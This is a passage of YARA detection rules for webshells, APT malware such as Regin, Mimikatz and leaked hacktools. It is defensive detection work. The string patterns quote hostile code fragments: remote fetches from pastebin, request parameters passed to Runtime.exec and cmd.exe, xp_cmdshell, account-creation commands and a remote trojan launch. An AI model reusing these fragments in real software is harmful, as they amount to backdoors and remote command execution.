      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "file_get_contents(\"http://pastebin.com" ascii
      $s1 = "xcurl('http://pastebin.com/download.php" ascii
      $s2 = "xcurl('http://pastebin.com/raw.php" ascii
      $x0 = "if($content){unlink('evex.php');" ascii
      $x1 = "$fh2 = fopen(\"evex.php\", 'a');" ascii
      $y0 = "file_put_contents($pth" ascii
      $y1 = "echo \"<login_ok>" ascii
      $y2 = "str_replace('* @package Wordpress',$temp" ascii
   condition: 
      1 of ( $s* ) or all of ( $x* ) or all of ( $y* )
} 

rule CoreImpact_sysdll_exe_RID2F93 : APT DEMO T1136 {
   meta:
      description = "Detects a malware sysdll.exe from the Rocket Kitten APT"
      author = "Florian Roth"
      reference = "-"
      date = "2014-12-27 12:03:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "d:\\nightly\\sandbox_avg10_vc9_SP1_2011\\source\\avg10\\avg9_all_vs90\\bin\\Rele" ascii
      $x1 = "Mozilla/5.0" fullword ascii
      $x2 = "index.php?c=%s&r=%lx&u=1&t=%s" fullword ascii
      $x3 = "index.php?c=%s&r=%lx" fullword ascii
      $x4 = "index.php?c=%s&r=%x" fullword ascii
      $x5 = "127.0.0.1" fullword ascii
      $x6 = "/info.dat" fullword ascii
      $z1 = "Content-Type: multipart/form-data; boundary=%S" fullword wide
      $z2 = "Encountered error sending error message to client" fullword ascii
      $z3 = "Encountered error building error message to client" fullword ascii
      $z4 = "Attempting to unlock uninitialized lock!" fullword ascii
      $z5 = "connect_back_tcp_channel#do_connect:: Error resolving connect back hostname" fullword ascii
      $z6 = "select_event_get(): fd not found" fullword ascii
      $z7 = "Encountered error sending syscall response to client" fullword ascii
      $z8 = "GetProcAddress() error" fullword ascii
      $z9 = "Error entering thread lock" fullword ascii
      $z10 = "Error exiting thread lock" fullword ascii
      $z11 = "connect_back_tcp_channel_init:: socket() failed" fullword ascii
      $z12 = "event_add() failed for ev." fullword ascii
      $z13 = "Uh, oh, exit() failed" fullword ascii
      $z14 = "event_add() failed for ev." fullword ascii
      $z15 = "event_add() failed." fullword ascii
      $z16 = "needroot" fullword ascii
      $z17 = "./plugins/" fullword ascii
   condition: 
      $s0 or all of ( $x* ) or 8 of ( $z* )
} 

rule Mimikatz_Memory_Rule_2_RID2FB7 : APT DEMO HKTL S0002 T1003 T1075 T1097 T1136 T1178 {
   meta:
      description = "Mimikatz Rule generated from a memory dump"
      author = "Florian Roth"
      reference = "-"
      date = "2014-12-22 12:09:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      type = "memory"
      tags = "APT, DEMO, HKTL, S0002, T1003, T1075, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "sekurlsa::" ascii
      $x1 = "cryptprimitives.pdb" ascii
      $x2 = "Now is t1O" ascii fullword
      $x4 = "ALICE123" ascii
      $x5 = "BOBBY456" ascii
   condition: 
      $s0 and 1 of ( $x* )
} 

rule SoakSoak_Infected_Wordpress_RID31D6 : DEMO T1076 T1100 T1136 WEBSHELL {
   meta:
      description = "Detects a SoakSoak infected Wordpress site http://goo.gl/1GzWUX"
      author = "Florian Roth"
      reference = "http://goo.gl/1GzWUX"
      date = "2014-12-15 13:39:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1076, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "wp_enqueue_script(\"swfobject\");" ascii fullword
      $s1 = "function FuncQueueObject()" ascii fullword
      $s2 = "add_action(\"wp_enqueue_scripts\", 'FuncQueueObject');" ascii fullword
   condition: 
      all of ( $s* )
} 

rule Weevely_Webshell_RID2D87 : DEMO FILE T1100 WEBSHELL {
   meta:
      description = "Weevely Webshell - Generic Rule - heavily scrambled tiny web shell"
      author = "Florian Roth"
      reference = "http://www.ehacking.net/2014/12/weevely-php-stealth-web-backdoor-kali.html"
      date = "2014-12-14 10:35:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, WEBSHELL"
      minimum_yara = "2.2.0"
      
   strings:
      $s0 = /\$[a-z]{4} = \$[a-z]{4}\("[a-z][a-z]?",[\s]?"",[\s]?"/ ascii
      $s1 = /\$[a-z]{4} = str_replace\("[a-z][a-z]?","","/ ascii
      $s2 = /\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\)\)\); \$[a-z]{4}\(\);/ ascii
      $s4 = /\$[a-z]{4}="[a-zA-Z0-9]{70}/ ascii
   condition: 
      uint32 ( 0 ) == 0x68703f3c and all of ( $s* ) and filesize > 570 and filesize < 800
} 

rule HawkEye_PHP_Panel_RID2D55 : DEMO T1056 T1100 T1136 WEBSHELL {
   meta:
      description = "Detects HawkEye Keyloggers PHP Panel"
      author = "Florian Roth"
      reference = "-"
      date = "2014-12-14 10:27:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1056, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$fname = $_GET['fname'];" ascii fullword
      $s1 = "$data = $_GET['data'];" ascii fullword
      $s2 = "unlink($fname);" ascii fullword
      $s3 = "echo \"Success\";" fullword ascii
   condition: 
      all of ( $s* ) and filesize < 600
} 

rule CN_Hacktool_MilkT_BAT_RID2EAC : CHINA DEMO HKTL SUSP T1136 {
   meta:
      description = "Detects a chinese Portscanner named MilkT - shipped BAT"
      author = "Florian Roth"
      reference = "-"
      date = "2014-12-10 11:24:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, HKTL, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" ascii
      $s1 = "if not \"%Choice%\"==\"\" set Choice=%Choice:~0,1%" ascii
   condition: 
      all of them
} 

rule JSP_jfigueiredo_APT_webshell_RID31E3 : APT DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
      author = "Florian Roth"
      reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/Browser.jsp"
      date = "2014-12-10 13:41:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "String fhidden = new String(Base64.encodeBase64(path.getBytes()));" ascii
      $a2 = "<form id=\"upload\" name=\"upload\" action=\"ServFMUpload\" method=\"POST\" enctype=\"multipart/form-data\">" ascii
   condition: 
      all of them
} 

rule JSP_jfigueiredo_APT_webshell_2_RID3274 : APT DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
      author = "Florian Roth"
      reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/"
      date = "2014-12-10 14:05:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "<div id=\"bkorotator\"><img alt=\"\" src=\"images/rotator/1.jpg\"></div>" ascii
      $a2 = "$(\"#dialog\").dialog(\"destroy\");" ascii
      $s1 = "<form id=\"form\" action=\"ServFMUpload\" method=\"post\" enctype=\"multipart/form-data\">" ascii
      $s2 = "<input type=\"hidden\" id=\"fhidden\" name=\"fhidden\" value=\"L3BkZi8=\" />" ascii
   condition: 
      all of ( $a* ) or all of ( $s* )
} 

rule Webshell_Insomnia_RID2DE4 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Insomnia Webshell - file InsomniaShell.aspx"
      author = "Florian Roth"
      reference = "http://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/"
      date = "2014-12-09 10:51:11"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Response.Write(\"- Failed to create named pipe:\");" fullword ascii
      $s1 = "Response.Output.Write(\"+ Sending {0}<br>\", command);" fullword ascii
      $s2 = "String command = \"exec master..xp_cmdshell 'dir > \\\\\\\\127.0.0.1" ascii
      $s3 = "Response.Write(\"- Error Getting User Info<br>\");" fullword ascii
      $s4 = "string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes," fullword ascii
      $s5 = "[DllImport(\"Advapi32.dll\", SetLastError = true)]" fullword ascii
      $s9 = "username = DumpAccountSid(tokUser.User.Sid);" fullword ascii
      $s14 = "//Response.Output.Write(\"Opened process PID: {0} : {1}<br>\", p" ascii
   condition: 
      3 of them
} 

rule OPCLEAVER_Parviz_Developer_RID3092 : APT DEMO T1136 {
   meta:
      description = "Parviz developer known from Operation Cleaver"
      author = "Florian Roth"
      reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
      date = "2014-12-02 12:45:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Users\\parviz\\documents\\" nocase
   condition: 
      $s1
} 

rule OPCLEAVER_CCProxy_Config_RID2F6E : APT DEMO T1090 T1136 {
   meta:
      description = "CCProxy config known from Operation Cleaver"
      author = "Florian Roth"
      reference = "http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf"
      date = "2014-12-02 11:56:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1090, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "UserName=User-001" fullword ascii
      $s2 = "Web=1" fullword ascii
      $s3 = "Mail=1" fullword ascii
      $s4 = "FTP=0" fullword ascii
      $x1 = "IPAddressLow=78.109.194.114" fullword ascii
   condition: 
      all of ( $s* ) or $x1
} 

rule Regin_Sample_3_RID2C59 : APT DEMO FILE T1050 T1136 {
   meta:
      description = "Detects Regin Backdoor sample fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-27 09:45:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Service Pack x" fullword wide
      $s1 = "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" fullword wide
      $s2 = "\\REGISTRY\\Machine\\Software\\Microsoft\\Windows NT\\CurrentVersion\\HotFix" fullword wide
      $s3 = "mntoskrnl.exe" fullword wide
      $s4 = "\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\Session Manager\\Memory Management" fullword wide
      $s5 = "Memory location: 0x%p, size 0x%08x" wide fullword
      $s6 = "Service Pack" fullword wide
      $s7 = ".sys" fullword wide
      $s8 = ".dll" fullword wide
      $s10 = "\\REGISTRY\\Machine\\Software\\Microsoft\\Updates" fullword wide
      $s11 = "IoGetRelatedDeviceObject" fullword ascii
      $s12 = "VMEM.sys" fullword ascii
      $s13 = "RtlGetVersion" fullword wide
      $s14 = "ntkrnlpa.exe" fullword ascii
   condition: 
      uint32 ( 0 ) == 0xfedcbafe and all of ( $s* ) and filesize > 160KB and filesize < 200KB
} 

rule Regin_sig_svcsstat_RID2E82 : APT DEMO T1136 {
   meta:
      description = "Detects svcstat from Regin report - file svcsstat.exe_sample"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-25 11:17:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      type = "file"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Service Control Manager" fullword ascii
      $s1 = "_vsnwprintf" fullword ascii
      $s2 = "Root Agency" fullword ascii
      $s3 = "Root Agency0" fullword ascii
      $s4 = "StartServiceCtrlDispatcherA" fullword ascii
      $s5 = "\\\\?\\UNC" fullword wide
      $s6 = "%ls%ls" fullword wide
   condition: 
      all of them and filesize < 15KB and filesize > 10KB
} 

rule Regin_Sample_2_RID2C58 : APT DEMO T1050 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file hiddenmod_hookdisk_and_kdbg_8949d000.bin"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-25 09:45:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\SYSTEMROOT\\system32\\lsass.exe" fullword wide
      $s1 = "atapi.sys" fullword wide
      $s2 = "disk.sys" fullword wide
      $s3 = "IoGetRelatedDeviceObject" fullword ascii
      $s4 = "HAL.dll" fullword ascii
      $s5 = "\\Registry\\Machine\\System\\CurrentControlSet\\Services" fullword ascii
      $s6 = "PsGetCurrentProcessId" fullword ascii
      $s7 = "KeGetCurrentIrql" fullword ascii
      $s8 = "\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\Session Manager" wide
      $s9 = "KeSetImportanceDpc" fullword ascii
      $s10 = "KeQueryPerformanceCounter" fullword ascii
      $s14 = "KeInitializeEvent" fullword ascii
      $s15 = "KeDelayExecutionThread" fullword ascii
      $s16 = "KeInitializeTimerEx" fullword ascii
      $s18 = "PsLookupProcessByProcessId" fullword ascii
      $s19 = "ExReleaseFastMutexUnsafe" fullword ascii
      $s20 = "ExAcquireFastMutexUnsafe" fullword ascii
   condition: 
      all of them and filesize < 40KB and filesize > 30KB
} 

rule Regin_Sample_Set_2_RID2DE3 : APT DEMO T1050 T1086 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file SHF-000052 and ndisips.sys"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-25 10:51:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1050, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "HAL.dll" fullword ascii
      $s1 = "IoGetDeviceObjectPointer" fullword ascii
      $s2 = "MaximumPortsServiced" fullword wide
      $s3 = "KeGetCurrentIrql" fullword ascii
      $s4 = "ntkrnlpa.exe" fullword ascii
      $s5 = "\\REGISTRY\\Machine\\System\\CurrentControlSet\\Control\\Session Manager" wide
      $s6 = "ConnectMultiplePorts" fullword wide
      $s7 = "\\SYSTEMROOT" fullword wide
      $s8 = "IoWriteErrorLogEntry" fullword ascii
      $s9 = "KeQueryPerformanceCounter" fullword ascii
      $s10 = "KeServiceDescriptorTable" fullword ascii
      $s11 = "KeRemoveEntryDeviceQueue" fullword ascii
      $s12 = "SeSinglePrivilegeCheck" fullword ascii
      $s13 = "KeInitializeEvent" fullword ascii
      $s14 = "IoBuildDeviceIoControlRequest" fullword ascii
      $s15 = "KeRemoveDeviceQueue" fullword ascii
      $s16 = "IofCompleteRequest" fullword ascii
      $s17 = "KeInitializeSpinLock" fullword ascii
      $s18 = "MmIsNonPagedSystemAddressValid" fullword ascii
      $s19 = "IoCreateDevice" fullword ascii
      $s20 = "KefReleaseSpinLockFromDpcLevel" fullword ascii
   condition: 
      all of them and filesize < 40KB and filesize > 30KB
} 

rule XYZCmd_zip_Folder_Readme_RID304A : DEMO SUSP T1136 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file Readme.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 12:33:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "3.xyzcmd \\\\RemoteIP /user:Administrator /pwd:1234 /nowait trojan.exe" fullword ascii
      $s20 = "XYZCmd V1.0" fullword ascii
   condition: 
      all of them
} 

rule PassSniffer_zip_Folder_readme_RID32AF : DEMO SUSP T1040 T1136 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file readme.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 14:15:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1040, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "PassSniffer.exe" fullword ascii
      $s1 = "POP3/FTP Sniffer" fullword ascii
      $s2 = "Password Sniffer V1.0" fullword ascii
   condition: 
      1 of them
} 

rule HKTL_BypassUacDll_6_RID2DDF : DEMO HKTL SUSP T1086 T1088 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file BypassUacDll.aps"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 10:50:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, SUSP, T1086, T1088, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "BypassUacDLL.dll" fullword wide
      $s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii
   condition: 
      all of them
} 

rule aspbackdoor_EDIT_RID2D1F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file EDIT.ASP"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 10:18:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<meta HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html;charset=gb_2312-80\">" fullword ascii
      $s2 = "Set thisfile = fs.GetFile(whichfile)" fullword ascii
      $s3 = "response.write \"<a href='index.asp'>" fullword ascii
      $s5 = "if Request.Cookies(\"password\")=\"juchen\" then " fullword ascii
      $s6 = "Set thisfile = fs.OpenTextFile(whichfile, 1, False)" fullword ascii
      $s7 = "color: rgb(255,0,0); text-decoration: underline }" fullword ascii
      $s13 = "if Request(\"creat\")<>\"yes\" then" fullword ascii
   condition: 
      5 of them
} 

rule aspbackdoor_entice_RID2E71 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file entice.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 11:14:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<Form Name=\"FormPst\" Method=\"Post\" Action=\"entice.asp\">" fullword ascii
      $s2 = "if left(trim(request(\"sqllanguage\")),6)=\"select\" then" fullword ascii
      $s4 = "conndb.Execute(sqllanguage)" fullword ascii
      $s5 = "<!--#include file=sqlconn.asp-->" fullword ascii
      $s6 = "rstsql=\"select * from \"&rstable(\"table_name\")" fullword ascii
   condition: 
      all of them
} 

rule Webshell_sig_238_cmd_2_RID2F09 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file cmd.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 11:40:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Process child = Runtime.getRuntime().exec(" ascii
      $s1 = "InputStream in = child.getInputStream();" fullword ascii
      $s2 = "String cmd = request.getParameter(\"" ascii
      $s3 = "while ((c = in.read()) != -1) {" fullword ascii
      $s4 = "<%@ page import=\"java.io.*\" %>" fullword ascii
   condition: 
      all of them
} 

rule Webshell_aspfile2_RID2DBC : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file aspfile2.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 10:44:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "response.write \"command completed success!\" " fullword ascii
      $s1 = "for each co in foditems " fullword ascii
      $s3 = "<input type=text name=text6 value=\"<%= szCMD6 %>\"><br> " fullword ascii
      $s19 = "<title>Hello! Welcome </title>" fullword ascii
   condition: 
      all of them
} 

rule Webshell_aspbackdoor_EDIR_RID30B2 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file EDIR.ASP"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 12:50:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "response.write \"<a href='index.asp'>" fullword ascii
      $s3 = "if Request.Cookies(\"password\")=\"" ascii
      $s6 = "whichdir=server.mappath(Request(\"path\"))" fullword ascii
      $s7 = "Set fs = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s19 = "whichdir=Request(\"path\")" fullword ascii
   condition: 
      all of them
} 

rule Webshell_aspbackdoor_asp4_RID3106 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file asp4.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 13:04:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "system.dll" fullword ascii
      $s2 = "set sys=server.CreateObject (\"system.contral\") " fullword ascii
      $s3 = "Public Function reboot(atype As Variant)" fullword ascii
      $s4 = "t& = ExitWindowsEx(1, atype)" ascii
      $s5 = "atype=request(\"atype\") " fullword ascii
      $s7 = "AceiveX dll" fullword ascii
      $s8 = "Declare Function ExitWindowsEx Lib \"user32\" (ByVal uFlags As Long, ByVal " ascii
      $s10 = "sys.reboot(atype)" fullword ascii
   condition: 
      all of them
} 

rule Webshell_aspfile1_RID2DBB : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file aspfile1.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 10:44:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "' -- check for a command that we have posted -- '" fullword ascii
      $s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
      $s5 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"><BODY>" fullword ascii
      $s6 = "<input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">" fullword ascii
      $s8 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
      $s15 = "szCMD = Request.Form(\".CMD\")" fullword ascii
   condition: 
      3 of them
} 

rule Webshell_aspbackdoor_regdll_RID3208 : DEMO T1100 T1117 T1136 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file regdll.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 13:47:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1117, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "exitcode = oShell.Run(\"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, " ascii
      $s3 = "oShell.Run \"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, False" fullword ascii
      $s4 = "EchoB(\"regsvr32.exe exitcode = \" & exitcode)" fullword ascii
      $s5 = "Public Property Get oFS()" fullword ascii
   condition: 
      all of them
} 

rule Webshell_aspbackdoor_asp3_RID3105 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file asp3.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 13:04:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<form action=\"changepwd.asp\" method=\"post\"> " fullword ascii
      $s1 = "  Set oUser = GetObject(\"WinNT://ComputerName/\" & UserName) " fullword ascii
      $s2 = "    value=\"<%=Request.ServerVariables(\"LOGIN_USER\")%>\"> " fullword ascii
      $s14 = " Windows NT " fullword ascii
      $s16 = " WIndows 2000 " fullword ascii
      $s18 = "OldPwd = Request.Form(\"OldPwd\") " fullword ascii
      $s19 = "NewPwd2 = Request.Form(\"NewPwd2\") " fullword ascii
      $s20 = "NewPwd1 = Request.Form(\"NewPwd1\") " fullword ascii
   condition: 
      all of them
} 

rule Webshell_aspbackdoor_asp1_RID3103 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Disclosed hacktool set (old stuff) - file asp1.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 13:04:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "param = \"driver={Microsoft Access Driver (*.mdb)}\" " fullword ascii
      $s1 = "conn.Open param & \";dbq=\" & Server.MapPath(\"scjh.mdb\") " fullword ascii
      $s6 = "set rs=conn.execute (sql)%> " fullword ascii
      $s7 = "<%set Conn = Server.CreateObject(\"ADODB.Connection\") " fullword ascii
      $s10 = "<%dim ktdh,scph,scts,jhqtsj,yhxdsj,yxj,rwbh " fullword ascii
      $s15 = "sql=\"select * from scjh\" " fullword ascii
   condition: 
      all of them
} 

rule Jc_WinEggDrop_Shell_RID2E4A : DEMO SUSP T1136 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file Jc.WinEggDrop Shell.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 11:08:11"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Sniffer.dll" fullword ascii
      $s4 = ":Execute net.exe user Administrator pass" fullword ascii
      $s5 = "Fport.exe or mport.exe " fullword ascii
      $s6 = ":Password Sniffering Is Running |Not Running " fullword ascii
      $s9 = ": The Terminal Service Port Has Been Set To NewPort" fullword ascii
      $s15 = ": Del www.exe                   " fullword ascii
      $s20 = ":Dir *.exe                    " fullword ascii
   condition: 
      2 of them
} 

rule EditKeyLogReadMe_RID2D10 : DEMO SUSP T1056 T1136 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file EditKeyLogReadMe_RID2D10.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 10:15:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1056, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "editKeyLog.exe KeyLog.exe," fullword ascii
      $s1 = "WinEggDrop.DLL" fullword ascii
      $s2 = "nc.exe" fullword ascii
      $s3 = "KeyLog.exe" fullword ascii
      $s4 = "EditKeyLog.exe" fullword ascii
      $s5 = "wineggdrop" fullword ascii
   condition: 
      3 of them
} 

rule aspbackdoor_ipclear_RID2ED9 : DEMO SUSP T1136 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file ipclear.vbs"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 11:32:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Set ServiceObj = GetObject(\"WinNT://\" & objNet.ComputerName & \"/w3svc\")" fullword ascii
      $s1 = "wscript.Echo \"USAGE:KillLog.vbs LogFileName YourIP.\"" fullword ascii
      $s2 = "Set txtStreamOut = fso.OpenTextFile(destfile, ForWriting, True)" fullword ascii
      $s3 = "Set objNet = WScript.CreateObject( \"WScript.Network\" )" fullword ascii
      $s4 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
   condition: 
      all of them
} 

rule HKTL_BypassUac_EXE_RID2D6F : DEMO HKTL SUSP T1086 T1088 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file BypassUacDll.aps"
      author = "Florian Roth"
      reference = "-"
      date = "2014-11-23 10:31:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, SUSP, T1086, T1088, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Wole32.dll" wide
      $s3 = "System32\\migwiz" wide
